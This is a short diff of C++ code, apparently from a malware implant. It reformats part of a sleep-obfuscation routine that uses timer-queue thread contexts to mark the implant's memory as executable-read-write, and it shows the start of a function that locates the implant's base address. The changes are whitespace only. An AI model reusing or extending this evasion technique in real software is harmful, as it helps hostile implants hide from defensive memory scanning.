@@ -111,8 +111,8 @@ obfus::sleep(const uint32_t sleep_time) {
         ctx_protrwx.Rip = reinterpret_cast<DWORD64>(VirtualProtect);
         ctx_protrwx.Rcx = reinterpret_cast<DWORD64>(image_base);
         ctx_protrwx.Rdx = image_size;
-        ctx_protrwx.R8 = PAGE_EXECUTE_READWRITE;
-        ctx_protrwx.R9 = reinterpret_cast<DWORD64>(&old_protect);
+        ctx_protrwx.R8  = PAGE_EXECUTE_READWRITE;
+        ctx_protrwx.R9  = reinterpret_cast<DWORD64>(&old_protect);
 
         // SetEvent(hEvent);
         ctx_setevent.Rsp -= 8;
@@ -132,6 +132,7 @@ obfus::sleep(const uint32_t sleep_time) {
 
     DeleteTimerQueue(hTimerQueue);
 }
+
 
 uint8_t*
 get_implant_base_address() {
